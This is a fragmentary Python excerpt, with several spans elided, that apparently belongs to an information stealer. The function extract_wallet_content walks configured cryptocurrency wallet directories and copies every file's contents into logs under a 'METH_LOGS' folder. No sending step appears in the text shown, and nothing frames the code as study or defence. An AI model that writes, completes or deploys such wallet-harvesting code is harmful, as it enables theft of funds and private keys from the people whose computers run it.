...
from config.paths import WALLETS

LOG_DIR = Path("METH_LOGS")
LOG_DIR.mkdir(exist_ok=True)

def extract_wallet_content(name, base_path):
    base = os.path.expandvars(base_path)
    if not os.path.exists(base):
        return

    category_file = LOG_DIR / f"wallets_{name.lower().replace(' ', '_')}.txt"
            ...
            for root, dirs, files in os.walk(base):
                for file in files:
                    ...
                    try:
                        ...
                        log.write("Binary or unreadable\n")
                        log.write("-" * 60 + "\n")
